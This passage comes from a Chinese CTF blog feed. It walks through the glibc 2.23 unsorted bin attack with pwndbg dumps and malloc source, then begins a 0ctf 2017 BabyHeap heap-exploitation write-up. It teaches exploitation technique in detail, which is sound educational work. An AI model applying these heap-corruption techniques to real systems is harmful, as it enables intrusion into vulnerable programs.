class="hljs-meta">#unsortedbin</span><br><span class="hljs-number">0x602010</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b78</span><br>    <span class="hljs-meta">#fd#bk</span><br><span class="hljs-number">0x602020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">30</span>gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:<span class="hljs-number">0x0000000100000000</span><span class="hljs-number">0x0000000000000000</span><br>......(省略内容均为空)<br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602620</span> <br> #指向top_chunk<br><span class="hljs-meta">#unsortedbin指向的地方</span><br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602000</span> <br>    <span class="hljs-meta">#unsortedbin</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:<span class="hljs-number">0x0000000000602000</span><span class="hljs-number">0x00007ffff7dd1b88</span><br><span class="hljs-number">0x7ffff7dd1ba0</span> &lt;main_arena+<span class="hljs-number">128</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b88</span><span class="hljs-number">0x00007ffff7dd1b98</span><br><span class="hljs-number">0x7ffff7dd1bb0</span> &lt;main_arena+<span class="hljs-number">144</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b98</span><span class="hljs-number">0x00007ffff7dd1ba8</span><br><span class="hljs-number">0x7ffff7dd1bc0</span> &lt;main_arena+<span class="hljs-number">160</span>&gt;:<span class="hljs-number">0x00007ffff7dd1ba8</span><span class="hljs-number">0x00007ffff7dd1bb8</span><br><span class="hljs-number">0x7ffff7dd1bd0</span> &lt;main_arena+<span class="hljs-number">176</span>&gt;:<span class="hljs-number">0x00007ffff7dd1bb8</span><span class="hljs-number">0x00007ffff7dd1bc8</span><br><span class="hljs-number">0x7ffff7dd1be0</span> &lt;main_arena+<span class="hljs-number">192</span>&gt;:<span class="hljs-number">0x00007ffff7dd1bc8</span><span class="hljs-number">0x00007ffff7dd1bd8</span><br><span class="hljs-number">0x7ffff7dd1bf0</span> &lt;main_arena+<span class="hljs-number">208</span>&gt;:<span class="hljs-number">0x00007ffff7dd1bd8</span><span class="hljs-number">0x00007ffff7dd1be8</span><br><span class="hljs-number">0x7ffff7dd1c00</span> &lt;main_arena+<span class="hljs-number">224</span>&gt;:<span class="hljs-number">0x00007ffff7dd1be8</span><span class="hljs-number">0x00007ffff7dd1bf8</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>在之前的文章中我们说过，当unsortedbin只有一个free_chunk时，它的fd和bk指针都指向unsortedbin本身。</p><p class='item-img' data-src='https://s2.loli.net/2023/09/13/brF2m8PKZeOVvRt.png'><img src="https://s2.loli.net/2023/09/13/brF2m8PKZeOVvRt.png" alt="Snipaste_2023-09-13_20-40-59.png"></p><h3 id="执行p-1-x3D-unsigned-long-amp-stack-var-2"><a href="#执行p-1-x3D-unsigned-long-amp-stack-var-2" class="headerlink" title="执行p[1]=(unsigned long)(&amp;stack_var-2);"></a>执行p[1]=(unsigned long)(&amp;stack_var-2);</h3><p>对代码第21行下断点，继续：p[1]=(unsigned long)(&amp;stack_var-2);</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span><br><span class="hljs-number">0x602010</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007fffffffdd68</span><br>    <span class="hljs-meta">#fd#bk被更改</span><br><span class="hljs-number">0x602020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>现在我们已经更改了unsortedbin中malloc_chunk1指针为0x00007fffffffdd68。刚好是刚才申请的 stack_var - 0x10 的位置</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><br>pwndbg&gt; unsortedbin <br>unsortedbin<br>all [corrupted]<br>FD: <span class="hljs-number">0x602000</span> ◂— <span class="hljs-number">0x0</span><br>BK: <span class="hljs-number">0x602000</span> —▸ <span class="hljs-number">0x7ffff7dd1b78</span> (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x602000</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x00007fffffffdd68</span><br><span class="hljs-number">0x7fffffffdd68</span>:<span class="hljs-number">0x00000000004007a8</span><span class="hljs-number">0x0000000000400870</span><br>    <span class="hljs-meta">#unsortedbin中bk指针所指向的地方</span><br><span class="hljs-number">0x7fffffffdd78</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602010</span><br>    #想要被修改为超大值的地方<br><span class="hljs-number">0x7fffffffdd88</span>:<span class="hljs-number">0xbfb16d8983641800</span><span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd98</span>:<span class="hljs-number">0x00007ffff7a2d840</span><span class="hljs-number">0x0000000000000001</span><br><span class="hljs-number">0x7fffffffdda8</span>:<span class="hljs-number">0x00007fffffffde78</span><span class="hljs-number">0x00000001f7ffcca0</span><br><span class="hljs-number">0x7fffffffddb8</span>:<span class="hljs-number">0x00000000004006a6</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffffffddc8</span>:<span class="hljs-number">0x9c796560ff5ea285</span><span class="hljs-number">0x00000000004005b0</span><br><span class="hljs-number">0x7fffffffddd8</span>:<span class="hljs-number">0x00007fffffffde70</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><h3 id="执行malloc-0x410"><a href="#执行malloc-0x410" class="headerlink" title="执行malloc(0x410)"></a>执行malloc(0x410)</h3><p>执行malloc(0x410)时，会判断所申请的chunk处于smallbin所在的范围，但是此时smallbin中并没有空闲的chunk，所以会去unsortedbin找，发现unsortedbin不空，于是把unsortedbin中的<strong>最后一个</strong>chunk拿出来。<br>由于上面我们修改了bk指针所指向的地址，所以现在bk指针所指向的地址被加入到了unsortedbin中，也就是说，现在这个地址是unsortedbin中最后一个chunk，malloc之后将在这个地址中创建堆块。</p><blockquote><p>unsortedbin在使用的过程中，采用的遍历顺序是FIFO（First In First out），即<strong>插入的时候插入到unsortedbin的头部，取出的时候从链尾获取。</strong></p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">malloc</span>之后结果如下：<br>pwndbg&gt; unsortedbin<br>unsortedbin<br>all [corrupted]<br>FD: <span class="hljs-number">0x602000</span> ◂— <span class="hljs-number">0x0</span><br>BK: <span class="hljs-number">0x7fffffffdd68</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   rbp<br>pwndbg&gt; x/<span class="hljs-number">30</span>gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:<span class="hljs-number">0x0000000100000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602620</span> #top_chunk<br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602000</span> <span class="hljs-meta">#malloc(0x410)</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:<span class="hljs-number">0x00007fffffffdd68</span><span class="hljs-number">0x00007ffff7dd1b88</span><br><span class="hljs-number">0x7ffff7dd1ba0</span> &lt;main_arena+<span class="hljs-number">128</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b88</span><span class="hljs-number">0x00007ffff7dd1b98</span><br><span class="hljs-number">0x7ffff7dd1bb0</span> &lt;main_arena+<span class="hljs-number">144</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b98</span><span class="hljs-number">0x00007ffff7dd1ba8</span><br><span class="hljs-number">0x7ffff7dd1bc0</span> &lt;main_arena+<span class="hljs-number">160</span>&gt;:<span class="hljs-number">0x00007ffff7dd1ba8</span><span class="hljs-number">0x00007ffff7dd1bb8</span><br><span class="hljs-number">0x7ffff7dd1bd0</span> &lt;main_arena+<span class="hljs-number">176</span>&gt;:<span class="hljs-number">0x00007ffff7dd1bb8</span><span class="hljs-number">0x00007ffff7dd1bc8</span><br><span class="hljs-number">0x7ffff7dd1be0</span> &lt;main_arena+<span class="hljs-number">192</span>&gt;:<span class="hljs-number">0x00007ffff7dd1bc8</span><span class="hljs-number">0x00007ffff7dd1bd8</span><br><span class="hljs-number">0x7ffff7dd1bf0</span> &lt;main_arena+<span class="hljs-number">208</span>&gt;:<span class="hljs-number">0x00007ffff7dd1bd8</span><span class="hljs-number">0x00007ffff7dd1be8</span><br><span class="hljs-number">0x7ffff7dd1c00</span> &lt;main_arena+<span class="hljs-number">224</span>&gt;:<span class="hljs-number">0x00007ffff7dd1be8</span><span class="hljs-number">0x00007ffff7dd1bf8</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x7fffffffdd68</span><br><span class="hljs-number">0x7fffffffdd68</span>:<span class="hljs-number">0x000000000040080a</span><span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd78</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x0000000000602010</span><br>    #现在此地址被更改为较大的数（其值为main_arena+<span class="hljs-number">88</span>的地址）<br><span class="hljs-number">0x7fffffffdd88</span>:<span class="hljs-number">0xbfb16d8983641800</span><span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd98</span>:<span class="hljs-number">0x00007ffff7a2d840</span><span class="hljs-number">0x0000000000000001</span><br><span class="hljs-number">0x7fffffffdda8</span>:<span class="hljs-number">0x00007fffffffde78</span><span class="hljs-number">0x00000001f7ffcca0</span><br><span class="hljs-number">0x7fffffffddb8</span>:<span class="hljs-number">0x00000000004006a6</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffffffddc8</span>:<span class="hljs-number">0x9c796560ff5ea285</span><span class="hljs-number">0x00000000004005b0</span><br><span class="hljs-number">0x7fffffffddd8</span>:<span class="hljs-number">0x00007fffffffde70</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt;  <br></code></pre></td></tr></tbody></table></figure><p>申请过程如下图所示：</p><p class='item-img' data-src='https://s2.loli.net/2023/09/13/FgS2tZmrEkG7Kuo.png'><img src="https://s2.loli.net/2023/09/13/FgS2tZmrEkG7Kuo.png" alt="Snipaste_2023-09-13_20-51-30.png"></p><p class='item-img' data-src='https://s2.loli.net/2023/09/13/rWY6xuMZ82yFJdj.png'><img src="https://s2.loli.net/2023/09/13/rWY6xuMZ82yFJdj.png" alt="Snipaste_2023-09-13_20-52-24.png"></p><p>核心代码如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#glibc-2.23/malloc/malloc.c</span><br>#源码第<span class="hljs-number">3515</span><span class="hljs-number">-3517</span>行<br>--------------------------------------------------------------------<br><span class="hljs-comment">/* remove from unsorted list */</span><br>unsorted_chunks (av)-&gt;bk = bck; <span class="hljs-comment">//unsortedbin的bk改为chunk的bk</span><br>bck-&gt;fd = unsorted_chunks (av);<span class="hljs-comment">//将chunk的bk所指向的fd改为unsortedbin的地址</span><br><span class="hljs-comment">//unsorted_chunks(av)其实是&amp;main_arena.top</span><br>--------------------------------------------------------------------<br>解释：<br>unsorted_chunks (av)-&gt;bk(unsortedbin的bk)= bck(chunk的bk); <br>bck-&gt;fd (chunk的fd)= unsorted_chunks (av);<br></code></pre></td></tr></tbody></table></figure><p>运行结果如下:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; info local<br>stack_var = <span class="hljs-number">140737351850872</span><span class="hljs-comment">//一个很大的数字 0x7ffff7dd1b78 实际上是 main_arena+88</span><br>p = <span class="hljs-number">0x602010</span><br></code></pre></td></tr></tbody></table></figure><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>再来看一下unsortedbin的源码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>     {<br>       bck = victim-&gt;bk;<br>       <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>           || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>         malloc_printerr (check_action, <span class="hljs-string">"malloc(): memory corruption"</span>,<br>                          chunk2mem (victim), av);<br>       size = chunksize (victim);<br><br>       <span class="hljs-comment">/*</span><br><span class="hljs-comment">          If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">          only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">          runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">          exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">          no exact fit for a small chunk.</span><br><span class="hljs-comment">        */</span><br> #显然，bck被修改，并不符合这里的要求<br>       <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>           bck == unsorted_chunks (av) &amp;&amp;<br>           victim == av-&gt;last_remainder &amp;&amp;<br>           (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>         {<br>           <span class="hljs-comment">/* split and reattach remainder */</span><br>           remainder_size = size - nb;<br>           remainder = chunk_at_offset (victim, nb);<br>           unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>           av-&gt;last_remainder = remainder;<br>           remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>           <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>             {<br>               remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>               remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>             }<br><br>           set_head (victim, nb | PREV_INUSE |<br>                     (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>           set_head (remainder, remainder_size | PREV_INUSE);<br>           set_foot (remainder, remainder_size);<br><br>           check_malloced_chunk (av, victim, nb);<br>           <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>           alloc_perturb (p, bytes);<br>           <span class="hljs-keyword">return</span> p;<br>         }<br><br>       <span class="hljs-comment">/* remove from unsorted list */</span><br></code></pre></td></tr></tbody></table></figure><p>可以看出，在将 unsorted bin 的最后一个 chunk 拿出来的过程中，<strong>victim 的 fd 并没有发挥作用，所以即使我们修改了其为一个不合法的值也没有关系。</strong>然而，需要注意的是，unsorted bin 链表可能就此破坏，在插入 chunk 时，可能会出现问题。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方<br>实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备<br><br>我们准备把这个地方 <span class="hljs-number">0x7fff7b5eecf8</span> 的值 <span class="hljs-number">0</span> 更改为一个很大的数<br><br>一开始先申请一个比较正常的 chunk: <span class="hljs-number">0x24d0010</span><br>再分配一个避免与 top chunk 合并<br><br>当我们释放掉第一个 chunk 之后他会被放到 unsorted bin 中，同时它的 bk 指针为 <span class="hljs-number">0x7f691338eb78</span><br>现在假设有个漏洞，可以让我们修改 <span class="hljs-built_in">free</span> 了的 chunk 的 bk 指针<br>我们把目标地址（想要改为超大值的那个地方）减去 <span class="hljs-number">0x10</span> 写到 bk 指针:<span class="hljs-number">0x7fff7b5eece8</span><br><br>再去 <span class="hljs-built_in">malloc</span> 的时候可以发现那里的值已经改变为 unsorted bin 的地址<br><span class="hljs-number">0x7fff7b5eecf8</span>: <span class="hljs-number">0x7f691338eb78</span><br></code></pre></td></tr></tbody></table></figure><p>这里我们可以看到 <strong>unsorted bin attack 确实可以修改任意地址的值</strong>，<strong>但是所修改成的值却不受我们控制</strong>，唯一可以知道的是，这个值比较大。这看起来似乎并没有什么用处，但是其实还是有点用的，比如说<br>● <strong>我们通过修改循环的次数来使得程序可以执行多次循环。</strong><br><strong>●</strong> <strong>我们可以修改heap中的global_max_fast来使得更大的chunk可以被视为 fastbin，这样我们就可以去执行一些 fastbin attack 了。</strong></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉全篇看最后一句话就够了(哈哈哈)</p><p>总结一下unsortedbin attack这种攻击方式：<br>首先我们将一个堆块释放到unsortedbin中，然后利用堆溢出修改unsortedbin中chunk的bk指针，这个bk指针是指向target_addr-0x10。当我们malloc申请unsortedbin中的堆块时，target_addr中的值就会变成main_arena+88地址的值</p><blockquote><p>target_addr：目标地址（想要修改为超大数的地址） </p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;关于unsorted-bin-和-unsorted-bin-attack&quot;&gt;&lt;a href=&quot;#关于unsorted-bin-和-unsorted-bin-attack&quot; class=&quot;headerlink&quot; title=&quot;关于unsorted bin 和 uns</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="unsoted bin attack" scheme="https://kylinxin.github.io/tags/unsoted-bin-attack/"/>
    
  </entry>
  
  <entry>
    <title>0ctf_2017_BabyHeap</title>
    <link href="https://kylinxin.github.io/2023/09/13/0ctf_2017_BabyHeap/"/>
    <id>https://kylinxin.github.io/2023/09/13/0ctf_2017_BabyHeap/</id>
    <published>2023-09-13T07:26:29.000Z</published>
    <updated>2023-09-13T09:29:56.357Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fastbin-attack中的Arbitrary-Alloc（例题）"><a href="#fastbin-attack中的Arbitrary-Alloc（例题）" class="headerlink" title="fastbin_attack中的Arbitrary Alloc（例题）"></a><strong>fastbin_attack中的Arbitrary Alloc（例题）</strong></h1><p>具体例子原理网上很多，这里就不再赘述了，这里讲解一道<strong>fastbin_attack中的Arbitrary Alloc</strong></p><blockquote><p>题目来源：0ctf 2017 BabyHeap<br>参考资料：<br><a href="https://blog.csdn.net/qq_36495104/article/details/106202135">https://blog.csdn.net/qq_36495104/article/details/106202135</a> #思路<br>CTF-wiki<br><a href="https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ">https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ</a> #payload<br><a href="https://blog.csdn.net/counsellor/article/details/81543197">https://blog.csdn.net/counsellor/article/details/81543197</a> #关闭地址随机化</p></blockquote><blockquote><p>附件：<br>链接: <a href="https://pan.baidu.com/s/1uG2cfQae0iwULtYvRmEBIw">https://pan.baidu.com/s/1uG2cfQae0iwULtYvRmEBIw</a>  密码: f1i6<br>–来自百度网盘超级会员V3的分享</p></blockquote><hr><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>将文件下载下来，首先检查一下文件的保护情况：</p><p class='item-img' data-src='https://s2.loli.net/2023/09/13/SUZpeg5FXnlivAP.png'><img src="https://s2.loli.net/2023/09/13/SUZpeg5FXnlivAP.png" alt="Snipaste_2023-09-13_15-31-15.png"></p><p>可以看到保护全部开启（这还玩个毛线啊）<br>具体看一下各个保护：</p><blockquote><p>Arch:   amd64-64-little<br>这个说明程序是64位程序，小端序<br>   RELRO:   Full RELRO<br>Full RELRO开启，使整个 GOT 只读，从而无法被覆盖，进一步来说GOT表无法被修改<br>   Stack:   Canary found<br>对使用随机数每个函数进行保护，防止栈溢出<br>   NX:    NX enabled<br>不能向栈上直接注入shellcode<br>   PIE:    PIE enabled<br>地址随机化，我感觉这个保护是最恶心的<br>来看一下我的Linux环境：<br>Ubuntu版本：16.04</p></blockquote><p>其中libc-2.23.so是我本机的libc文件</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>整个程序相当于一个堆内存管理器，静态分析一下吧：</p><h3 id="main-函数"><a href="#main-函数" class="headerlink" title="main 函数"></a>main 函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>{<br>  <span class="hljs-type">char</span> *addr; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  addr = get_addr();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    menu();                                     <span class="hljs-comment">// </span><br>                                                <span class="hljs-comment">//   puts("1. Allocate");</span><br>                                                <span class="hljs-comment">//   puts("2. Fill");</span><br>                                                <span class="hljs-comment">//   puts("3. Free");</span><br>                                                <span class="hljs-comment">//   puts("4. Dump");</span><br>                                                <span class="hljs-comment">//   puts("5. Exit");</span><br>                                                <span class="hljs-comment">//   printf("Command: ");</span><br>                                                <span class="hljs-comment">// </span><br>    input();<br>    <span class="hljs-keyword">switch</span> ( (<span class="hljs-type">unsigned</span> __int64)off_14F4 )<br>    {<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1uLL</span>:<br>        Allocate((__int64)addr);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2uLL</span>:<br>        Fill((__int64)addr);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3uLL</span>:<br>        Free((__int64)addr);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4uLL</span>:<br>        Dump((__int64)addr);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5uLL</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">continue</span>;<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>主函数内容，包含菜单函数和四个堆功能函数</p><h3 id="get-addr-函数-生成随机地址"><a href="#get-addr-函数-生成随机地址" class="headerlink" title="get_addr 函数(生成随机地址)"></a>get_addr 函数(生成随机地址)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *<span class="hljs-title function_">get_addr</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// [rsp+4h] [rbp-3Ch]</span><br>  <span class="hljs-type">char</span> *addr; <span 